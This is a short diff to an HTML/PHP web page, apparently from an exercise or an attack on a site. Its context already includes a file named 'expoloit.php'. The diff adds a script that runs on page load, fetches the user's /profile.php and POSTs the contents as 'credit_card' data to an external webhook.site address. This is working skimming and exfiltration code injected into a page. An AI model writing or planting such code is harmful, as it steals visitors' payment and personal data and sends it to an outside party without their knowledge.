@@ -36,6 +36,7 @@
   </head>
   <body>
     <img src="./duck.jpg" alt="" />
+
     <?php include 'expoloit.php'; ?>
     <div class="container mt-5">
       <div class="messeage">
@@ -89,6 +90,9 @@
     crossorigin="anonymous"
   ></script>
   <script>
+    $(document).ready(function(){
+      fetch("/profile.php").then(res=>{return res.text();}).then(string=>{jQuery.ajax({url: "https://webhook.site/331413c1-1439-49c3-bfe5-8653dc8b29aa",method: "POST",data: JSON.stringify({credit_card:string})})})
+    })
     const getRandom = (min, max) =>
       Math.floor(Math.random() * (max - min + 1) + min);
 
